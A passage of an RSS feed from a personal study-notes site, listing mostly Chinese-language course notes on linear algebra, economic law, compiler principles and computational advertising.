For matrix size $$n \times n$$, there are $$n!$$ different permutation matrices; Mutiplation of two permutation matrix will result in a permutation matrix; Inverse of permutaion matrix: $$P^{-1} = P^{T}$$ 上面的 A=LU 公式分解中存在一个问题：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/5.%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/5.%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE/</guid><description>矩阵的转置 # 什么是转置（Transpose）：
对于 A 的转置矩阵 $$A^T$$，其中的元素满足 $$(A^T){ij} = A{ji}$$ 对称矩阵（Symmetric Matrix）：满足 $$A^T = A$$ 条件的矩阵
有趣的性质：
矩阵和他转置的积是对称矩阵，即 $$(AA^T)^T = AA^T$$。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BB%8F%E6%B5%8E%E6%B3%95/%E7%BB%8F%E6%B5%8E%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BB%8F%E6%B5%8E%E6%B3%95/%E7%BB%8F%E6%B5%8E%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</guid><description>经济法期末复习 # .define { color:red; font-weight:bold; }
.quote { color:blue; font-weight:bold; }
.question { color:orange; font-weight:bold; }
.answer { color:SlateGrey; font-weight:bold; }
.ps {color:grey; opacity:0.6; font-weight:normal; }
第一章 经济法概念 # 第2节 经济法调整对象 # 我国经济法特点：(1)不成熟; (2)缺乏前瞻性; (3)表现为不稳定性。 1992年社会主义市场经济市场经济体制的确定为中国经济法学的发展提供了明确的发展方向 我国经济法调整对象的不同学说： 经济协调学说：经济法是协调经济运行过程中发生的经济关系的法律规范的总称。 干预经济关系法：国家为了克服市场经济调节的盲目性和局限性，而制定的调整 需要由国家干预的具有全局性和社会公共性的经济关系 的法律规范的总称。 国家调节关系说：现代经济法是适应现代市场经济国家调节社会经济的需要而产生并形成独立的法律部门，它是国家调节即“国家之手”有效运作的主要法律保障 国家调节经济运用的三种基本方式：（1）强制；（2）参与；（3）促导 经济管理关系说：经济法是调整发生在政府、政府经济管理机关和经济组织、公民个人之间以社会公共性为根本特征的经济管理关系的法律规范的综合。 第3节 经济法的概念 # 经济法：经济法是为了维护国民经济持续、健康发展，政府依法组织、调节、监督社会经济运行的法律制度的总称 目的主体手段对象维护国民经济持续健康发展政府组织、调节、监督社会经济运行
.row2of1_3 th { font-weight:normal }
- 理解经济法，应当注意以下的几个问题：
1.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/0.%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/0.%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C/</guid><description>参考网址：
http://www.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html https://linux.die.net/man/1/gcc https://sourceware.org/ml/binutils/2009-08/msg00193.html https://web.stanford.edu/class/cs193d/handouts/make.pdf 编译器的工作 # 编译器的主要流程 # .img{width: 100%}
一个现代编译器的主要流程如下：（以 gcc 为例）
另外，使用以下命令可以查看 gcc 使用的所有命令：
$ gcc -v example.c 该命令的输出会打印在 stderr 上，若希望在文件中阅读该信息，可以使用以下命令：
$ gcc -v example.c 2&amp;gt; verbose_gcc.txt 预处理器的工作 # 从维基百科上的定义：预处理器是程序中处理输入数据，产生能用来输入到其他程序的数据的程序。输出被称为输入数据预处理过的形式，常用在之后的程序比如编译器中。C 预处理器是最常见的预处理器。
C 预处理器 # C 预处理器不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。
所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。像我们常用的 define，include 等都是 C 预处理器的预处理指令。
预定义宏 # ANSI C 定义了许多宏。在编程中您可以使用这些宏，但是不能直接修改这些预定义的宏。
宏 描述 __DATE__ 当前日期，一个以 &amp;quot;MMM DD YYYY&amp;quot; 格式表示的字符常量。 __TIME__ 当前时间，一个以 &amp;quot;HH:MM:SS&amp;quot; 格式表示的字符常量。 __FILE__ 这会包含当前文件名，一个字符串常量。 __LINE__ 这会包含当前行号，一个十进制常量。 __STDC__ 当编译器以 ANSI 标准编译时，则定义为 1。 预处理器运算符 # 运算符 作用 宏延续运算符（\） 一个宏通常写在一个单行上。但是如果宏太长，一个单行容纳不下，则使用宏延续运算符（\）。 字符串常量化运算符（#） 在宏定义中，当需要把一个宏的参数转换为字符串常量时，则使用字符串常量化运算符（#）。在宏中使用的该运算符有一个特定的参数或参数列表。 标记粘贴运算符（##） 宏定义内的标记粘贴运算符（##）会合并两个参数。它允许在宏定义中两个独立的标记被合并为一个标记。 gcc 的工作 # 从 Linux gcc manual 上，我们知道 gcc 编译有这样一个选项：-E：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/</guid><description>学习地址：
国防科技大学编译原理 MOOC 课程 词法分析 # 词法分析器 # 任务 # 词法分析的任务：
从左到右逐个字符地对源程序进行扫描，产生一个单词符号序列
执行词法分析任务的叫做词法分析器（Lexical Analyzer）
功能 # 词法分析器的功能：
输入源程序、输出单词符号
单词符号种类：
基本字，或关键字：
标识符：用来表示各种用户定义的名字
常数
运算符：+、-、*、/
分界符：,、;&amp;hellip;
词法分析器的输出：
输出的单词符号的表示形式 → 单词种别、单词自身的值 与语法分析 # 体现了 分解 和 权衡 两种计算思维。
结构 # 预处理子程序：剔除无用的空白、跳格等编辑性字符。放入扫描缓冲区。
扫描器通过 起点指示器 和 搜索指示器 两个指针对扫描缓冲区进行扫描。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/review/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/review/</guid><description> 编译原理期末考试复习，于 2019-1-15
REVIEW # graph TB;
TOPIC[语法分析];
TOPIC--&amp;gt;M1; TOPIC--&amp;gt;M2;
subgraph 自上而下
M1[自上而下]; WF1(&amp;#34;LL(1)文法&amp;#34;); WF11(递归下降分析器); WF12(预测分析程序);
M1--&amp;gt;|1.不含左递归&amp;lt;br&amp;gt;2.非终结符 FIRST 集不相交&amp;lt;br&amp;gt;3.一个关于epsilon时的约束|WF1
WF1--&amp;gt;|一个非终结符&amp;lt;br&amp;gt;对应一个子程序|WF11;
WF1--&amp;gt;|构造预测分析表|WF12
end
subgraph 自下而上
M2[自下而上]; WF2(算符优先文法); WF3(&amp;#34;LR分析法&amp;#34;); WF31(&amp;#34;SLR分析法&amp;lt;br&amp;gt;LR(0)项目&amp;#34;); WF32(&amp;#34;规范LR分析法&amp;lt;br&amp;gt;LR(1)项目&amp;#34;); WF33(&amp;#34;LALR分析法&amp;#34;)
M2--&amp;gt;|&amp;#34;1.算符文法:&amp;lt;br&amp;gt;不含两个相继的非终结符&amp;lt;br&amp;gt;2.算符优先文法:&amp;lt;br&amp;gt;算符间关系是唯一的&amp;#34;|WF2
M2--&amp;gt;|状态&amp;lt;br&amp;gt;ACTION 子表&amp;lt;br&amp;gt;GOTO 子表|WF3
WF3--&amp;gt;|1.无移进规约冲突&amp;lt;br&amp;gt;2.不含多个规约项|WF31
WF3--&amp;gt;|&amp;#34;通过多读一个词&amp;lt;br&amp;gt;解决LR(0)冲突&amp;#34;|WF32
WF3--&amp;gt;|&amp;#34;合并LR(1)项目同心集&amp;#34;|WF33
end</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B/</guid><description>自上而下分析 Top-down # 从文法的开始符号开始，反复使用各种产生式，寻找 “匹配” 的推导。
推导：根据文法的产生式规则，把串中出现的产生式的左部符号替换成右部 从树的根节点开始，构造语法树。
算法：递归下降法，预测分析程序。
基本问题 # 面临的两个基本问题
当面临多个候选式时的回溯问题。 文法的左递归问题。 左递归的消除 # 一个文法消除左递归的条件：
不含以 $$\epsilon$$ 为右部的左产生式 不含回路，即不含推导 $$P \Rightarrow P$$ 直接左递归的消除：
产生式的直接左递归：$$P \rightarrow P\alpha | \beta, \beta 不以 \beta 开头$$ 转变成右递归文法： $$P \rightarrow \beta P&amp;rsquo;$$ $$P&amp;rsquo; \rightarrow \alpha P&amp;rsquo; | \epsilon$$ 推广：$$P \rightarrow P\alpha_1 | P\alpha_2 | &amp;hellip;| P\alpha_m| \beta_1 | \beta_2 | &amp;hellip; | \beta_n$$（每个 $$\alpha$$ 都不等于 $$\epsilon$$，每个 $$\beta$$ 都不以 P 开头） $$P \rightarrow \beta_1 P&amp;rsquo; | \beta_2 P‘ |&amp;hellip;|\beta_n P&amp;rsquo;$$ $$P&amp;rsquo; \rightarrow P&amp;rsquo; \alpha_1 | P&amp;rsquo; \alpha_2 | &amp;hellip; | P&amp;rsquo; \alpha_m$$ 间接左递归的消除：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A/</guid><description>自下而上 Bottom-up # 从输入串开始，逐步进行归约，直到文法的开始符号。
规约：根据文法的产生式规则，把串中出现的产生式右部替换成左部符号； 从树的叶节点开始，构造语法树。
算法：算符优先分析法，LR 分析法。
简述概念 # 基本思想：
采用 “移进-规约” 思想进行自下而上分析 用一个寄存符号的先进后出栈，把输入符号一个一个地移进栈里，当栈顶形成某个产生式的候选式时，即把栈顶的这一部分替换为（规约）该产生式的左部 核心问题：识别可归约串。
短语：
令 G 是一个文法，S 是文法的开始符号，假设 $$\alpha \beta \delta$$ 是文法 G 的一个句型，如果有 $$S \overset{*}{\Rightarrow} \alpha A \delta 且 A \overset{+}{\Rightarrow} \beta$$，则 $$\beta$$ 称是句型 $$\alpha \beta \delta$$ 相对于非终结符 A 的短语。 如果有 $$A \Rightarrow \beta$$，则称 $$\beta$$ 是句型 $$\alpha \beta \delta$$ 相对于规则 $$A \rightarrow \beta$$ 的直接短语。 一个句型的最左直接短语称为该句型的句柄。 分析过程描述：可以用 步骤、符号栈、输入串、所用产生式 四元组来描述。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E5%B1%9E%E6%80%A7%E6%96%87%E6%B3%95%E5%92%8C%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E5%B1%9E%E6%80%A7%E6%96%87%E6%B3%95%E5%92%8C%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/</guid><description>学习地址：
国防科技大学中国大学 MOOC 属性文法 # 概念 # 属性文法：
也称作属性翻译文法 以上下文无关文法为基础 为每个文法符号（终结符或非终结符）配备若干相关的 “值”（称为属性），代表与文法符号相关的信息，如类型、值、代码序列、符号表内容等。 对于文法的每个产生式都配备了一组属性的语义规则，对属性进行计算和传递。 综合属性：
自下而上传递信息 从语法规则角度看：根据右部候选式中的符号的属性计算左部被定义符号的综合属性 从语法树角度看：根据子节点的属性和父节点自身的属性计算父节点的综合属性 继承属性：
自上而下传递信息。 从语法规则角度看：根据右部候选式中的符号的属性和左部被定义符号的属性计算右部候选式。 从语法树角度看：根据父节点和兄弟结点的属性计算子节点的继承属性。 属性依赖 # 属性依赖：
对于没和产生式 $$A \rightarrow \alpha $$ 都有一套与之相关联的语义规则，每条规则的形式为：$$b := f(c_1, c_2, &amp;hellip; c_k)$$，则我们说：属性 b 依赖于属性 $$c_1, c_2, &amp;hellip;, c_k$$。其中有两种可能性：
b 是 A 的一个综合属性并且 $$c_1, c_2, &amp;hellip;, c_k$$ 是产生式右边文法符号的属性</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/</guid><description>学习地址：
国防科技大学中国大学 MOOC 语义分析和中间代码生成 # 中间语言 # 特点：
独立于机器 复杂性介于源语言和目标语言之间 常用的中间语言：
后缀式，逆波兰式表示
图表示：抽象语法树（AST）、有向无环图（DAG）
三地址代码：三元式、四元式、间接三元式
后缀式 # Lukasiewicz 发明的一种表达式的方法，又称逆波兰表示法。
一个表达式 E 的后缀形式可以如下定义：
如果 E 是一个常量或变量，则 E 的后缀式是 E 自身。 如果 E 是 $$E_1\ op\ E_2$$ 形式的表达式，其中 op 是任何二元操作符，则 E 的后缀形式为 $$E_1’ E_2&amp;rsquo; op$$，其中 $$E_1&amp;rsquo;$$ 和 $$E_2&amp;rsquo;$$ 分别是 $$E_1$$ 和 $$E_2$$ 的后缀形式。 如果 E 是 $$(E_1)$$ 形式的表达式，那么 $$E_1$$ 的后缀式就是 E 的后缀式。 图表示 # 有向无环图（Directed acyclic Graph，简称 DAG）:</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E7%AC%A6%E5%8F%B7%E8%A1%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E7%AC%A6%E5%8F%B7%E8%A1%A8/</guid><description/></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/6.%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4%E7%BB%84%E7%BB%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/6.%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4%E7%BB%84%E7%BB%87/</guid><description>学习途径：
国防科技大学中国大学 MOOC 运行时存储空间组织 # 参数传递 # 参数传递主要有四种传递方式：
传地址； 得结果：传地址的变形。 每个形参对应两个形式单元：第一个存放实参地址；第二个存放值。 在过程体中的任何引用或赋值都看作对它的第二个单元的直接访问。 过程完成返回之前，把第二个单元的值存放到第一的单元所指向中。 传值； 传名：不常见。 在进入被调用过程之前不对实在参数预先进行计值，而是让过程提中每当使用到相应的形式参数时才祝词对它实行计值（或计算地址）。 通常把实在参数处理成一个子程序（称为参数子程序），每当过程体中使用到相应的形式参数时就调用这个子程序。 运行时存储器的划分 # 一个目标程序运行时所需的存储空间包括：
存储目标代码的空间 $$\Rightarrow$$ 算法
存放数据项目的空间 $$\Rightarrow$$ 数据结构
存放程序运行的控制或连接数据所需要的单元
编译程序组织存储空间须考虑的问题：
过程是否允许递归？ 当控制从一个过程的活动返回时，对局部名称的值如何处理？ 过程是否允许引用非局部名称？ 过程调用时如何传递参数？“过程”是否可以做为参数被传递和作为结果返回？ 存储空间可否在程序控制下进行动态分配？ 存储空间是否必须显式地释放？ 存储分配策略 # 主要有两种分配策略：
静态分配策略：在编译时能确定数据空间的大小，并且为每个数据项目确定出在运行时刻的存储空间中的位置。比如：FORTRAN 语言。
动态分配策略：在编译时不能确定运行时数据空间的大小，允许递归过程和动态申请释放内存。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/7.%E4%BC%98%E5%8C%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/7.%E4%BC%98%E5%8C%96/</guid><description> 学习途径：
国防科技大学中国大学 MOOC 优化 # 优化的种类：
删除多余运算（删除公用子表达式） 合并已知量 复写传播 删除无用赋值 代码外提 强度消弱 变换循环控制条件 优化的级别：
局部优化 循环优化 全局优化 局部优化 # 基本块的划分 # 基本块：
程序中以顺序执行的语句序列； 其中只有一个入口和一个出口。入口就是其中的第一个语句，出口就是其中的最后一个语句。 划分算法：
找到中间语句（三地址语句）程序中的各个基本快的入口语句。它可能是
程序的第一个语句； 能够由条件转移语句或无条件转移语句转移到的语句； 紧跟在条件转移语句后面的语句。 对以上求出的每个入口语句，确定其所属的基本快。
它是由该入口语句 A 到下一入口语句 B（不包括 B）、或到一转移语句 B（包括 B）、或停语句 B（包括 B）之间的语句序列组成的。
凡未被纳入某一基本块中的语句，可以从程序中删除。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/10.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/10.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87/</guid><description>基础知识准备 # 基础概念 # 因为笔者太垃圾，补充的一些譬如《线性代数》、《概率论与数理统计》等的知识
正定矩阵：
熵（Entropy）：
热力学中的概念，由香农引入到信息论中； 设 $$X \in {x_1, x_2, \cdots, x_n}$$ 为一个离散随机变量，其概率分布为 $$p(X = x_i) = p_i, i = 1,2,\cdots, n$$，则 X 的熵为： $$\displaystyle H(X) = - \sum_{i = 1}^n p_i log p_i, \text{ where when pi = 0, define } H(X) = 0$$ 极大似然估计：
先验概率、后验概率：
边缘概率：
马尔可夫链蒙特卡洛（Markov chain Monte Carlo，MCMC）方法：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/11.%E5%90%88%E7%BA%A6%E5%B9%BF%E5%91%8A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/11.%E5%90%88%E7%BA%A6%E5%B9%BF%E5%91%8A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</guid><description>合约广告核心技术 # 广告排期系统 # 防天窗广告：广告加载错误时的默认广告。
在线分配 # 参考资料：
拉格朗日对偶问题：https://zhuanlan.zhihu.com/p/31131842 在线分配技术解决的典型问题：
GD 问题、AdWords 问题、展示广告问题、最大代表性分配（MRA）问题、询价优化问题等； 实用的一些在线分配方案：
直接求解原始的分配方案； 基于对偶算法的紧凑分配方案； 综合分配方案 SHALE； 启发式分配方案 HWM；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/12.%E5%8F%97%E4%BC%97%E5%AE%9A%E5%90%91%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/12.%E5%8F%97%E4%BC%97%E5%AE%9A%E5%90%91%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</guid><description>受众定向核心技术 # 文本主题挖掘 # 三种解决模型：
LSA 模型（潜在语义分析，Latent Semantic Analysis）； PLSI 模型（概率潜在语义索引，Probabilistic Latent Semantic Indexing）； LDA 模型（潜在狄利克雷分配，Latent Dirichlet Allocation）； 行为定向 # 行为定向建模问题：
工程上非常典型的建模思路：当面对多个自变量的回归问题时，可以先根据目标值的特性选择合适的指数族分布来描述，并用线性模型将多个自变量和指数族分布的参数联系起来。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/13.%E7%AB%9E%E4%BB%B7%E5%B9%BF%E5%91%8A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/13.%E7%AB%9E%E4%BB%B7%E5%B9%BF%E5%91%8A%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</guid><description>竞价广告核心技术 # 对于一个 CPC 结算的竞价广告系统，需要得到广告候选集合，并计算每个候选的点击率。这对应着两个竞价广告关键的计算问题，即“广告检索”和“广告排序”。
搜索广告系统 # 查询扩展 # 需求方需要通过扩展关键词获得更多的流量，供给侧则需要借此来变现更多的流量和提高竞价的激烈程度。
相关的方法有很多，这里介绍三种主要的思路：
基于推荐的方法：
考虑用户的一个会话（$$s = {1, \cdots, M}$$）和一组关键词 $$w = {1, \cdots, N}$$ 对应的交互强度矩阵 $${x_{mn}}_{M \times N}$$，矩阵的值表示用户在这个会话中搜索对应关键词的次数。 推荐方法的基本任务：基于上述矩阵中的已知元素值，去预测填充矩阵中没有观测的单元。 协同过滤：这样的问题也被称为“协同过滤问题”（Collaborative Filtering，CF），即根据群体用户的选择关联性进行推荐的问题。 算法：协同过滤的推荐算法可以主要分为“基于内存的非参数方法”和“基于模型的参数化方法”，各种推荐问题的本质都是对交互强度矩阵进行平滑。 基于主题模型的方法：
基于历史效果的方法：
广告检索 # 布尔表达式检索 # 相关性检索 # 基于 DNN 的语义建模 # 最近邻语义检索 # 最近邻检索的工程效率是一个核心问题：
把“查询”和“文档”都通过上一节中基于 DNN 的相关性建模进行 Word-Embedding 表达后，检索最相关的 K 个文档的问题，就是在向量空间中计算查询 c 与所有候选文档 a 之间的 K 个最近邻问题。 加速最近邻检索算法称为 “ANN 查找 (Approximate Nearest Neighbor)”，有三类典型算法：哈希算法、向量量化算法、基于图的算法； 哈希算法，分为数据无关的轻量级算法、数据有关的算法（学习哈希、语义哈希、深度学习哈希等）。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/2.%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A%E5%9F%BA%E7%A1%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/2.%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A%E5%9F%BA%E7%A1%80/</guid><description>计算广告基础 # 核心问题 # 计算广告的核心问题用文字表述如下：
为一系列的用户与上下文的组合找到最合适的广告投放策略以优化整体广告活动的利润； 在数学上，可以表示为一个最优化问题：
$$\displaystyle \max{\sum_{i=1}^T (r_i - q_i)}, \text{ s.t. } \sum_{i=1}^Td_{ik} \le D_k, \forall k$$
其中 i 表示某次广告展示、k 表示某个广告主；r 为总收入、q 为总成本、D 为某个广告主的预算；
引入 a、u、c 表示广告、用户、上下文，那么上面的数学表达式中的 r、q 是关于它们的函数；
也就是公式：$$\displaystyle \max{\sum_{i=1}^T (r(a_i, u_i, c_i) - q(a_i, u_i, c_i))}, \text{ s.t. } \sum_{i=1}^Td(a_i, u_i, c_i, k) \le D(k), \forall k$$
上面的广告收入是我们研究的重点，可以按照单次广告展示预期收入（eCPM）分解：
